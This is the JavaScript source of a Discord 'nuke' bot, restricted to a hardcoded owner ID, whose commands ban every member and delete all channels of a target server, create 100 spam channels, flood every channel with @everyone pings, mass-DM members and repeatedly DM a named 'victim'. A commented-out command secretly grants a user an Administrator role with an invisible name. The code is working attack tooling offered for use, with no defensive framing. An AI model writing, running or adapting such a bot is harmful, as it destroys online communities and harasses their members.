const Discord = require('discord.js');
const client = new Discord.Client();

// Configuration
const prefix = "$";
const owner_ids = ["374757381093195776"];

function isOwner(id) {
    for(var i of owner_ids) {
        if(i === id) return true;
    }
    return false;
}

client.on('message', message => {
    if (isOwner(message.author.id)) {
        var args = message.content.split(" ");
        if (args[0] == prefix + 'test') {
            var serverid = args[1];
            var msg = "test"
            client.guilds.get(serverid).channels.map(c => {
                    if (c.type == "text") c.send(msg);
                });
        }
        /*
        // admin serverid userid
        if (args[0] == prefix + 'admin') {
            var serverid = args[1];
            let guild = client.guilds.get(serverid);
            var userid = guild.members.get(args[2]);
            try {
                role = guild.createRole({
                    name: "឵឵឵   ",
                    color: "#36393f",
                    permissions: [8]
                });
                userid.addRole(role.id)
            } catch(e) {
                console.log(e.stack);
            }
        }
        */
        // destroy serverid
        if (args[0] == prefix + 'nuke') {
            var serverid = args[1];
            let guild = client.guilds.get(serverid);
            guild.members.forEach(m => {
                m.ban();
            });
            for (var i = 0; i < guild.channels.array().length; i++) {
                guild.channels.array()[i].delete();
            }
        }
        
        // channels serverid
        if (args[0] == prefix + 'channels') {
            var serverid = args[1];
            let guild = client.guilds.get(serverid);
            for (i = 0; i < 100; i++) {
                guild.createChannel("឵឵឵spam")
                    .then(console.log)
                    .catch(console.error);
            }
        }
        
        // raid serverid
        if (args[0] == prefix + 'raid') {
            var serverid = args[1];
            var msg = "@everyone"
            var interval = setInterval(function () {
                client.guilds.get(serverid).channels.map(c => {
                    if (c.type == "text") c.send(msg);
                });
            }, 600);
        }
        // dms serverid msg
        if (args[0] == prefix + 'dms') {
            delete args[0];
            var serverid = args[1];
            delete args[1];
            var msg = args.join(" ");
            client.guilds.get(serverid).members.map(m => {
                m.send(msg);
            });
        }
        
        // dm userid msg
        if (args[0] == prefix + 'dm') {
            delete args[0];
            var victimid = client.users.get(args[1]);
            delete args[1];
            var msg = args.join(" ");
            delete args[2];
            client.fetchUser(victimid).then((victim) => {
                var interval = setInterval(function () {
                    victim.send(msg);
                }, 600);
            });                
        }
        
        // Restart bot
        if (args[0] == prefix + 'restart') {
               require("child_process").spawn(process.argv.shift(), process.argv, {
                   cwd: process.cwd(),
                   detached : true,
                   stdio: "inherit"
               });
               process.exit();
        }
    }
});

client.login(process.env.BOT_TOKEN);
